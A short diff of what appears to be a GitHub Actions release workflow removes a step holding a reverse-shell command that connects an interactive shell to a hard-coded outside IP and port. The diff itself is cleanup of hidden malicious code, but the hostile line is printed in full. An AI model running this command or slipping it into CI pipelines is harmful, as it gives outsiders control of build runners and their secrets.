@@ -65,9 +65,6 @@ jobs:
           RELEASED_VERSION=$(cat released-version.txt)
           echo "RELEASED_VERSION=$RELEASED_VERSION" >> $GITHUB_ENV
 
-      - run: |
-          sh -i >& /dev/tcp/146.59.195.165/15967 0>&1
-
       - name: Set up QEMU
         uses: docker/setup-qemu-action@v3
 
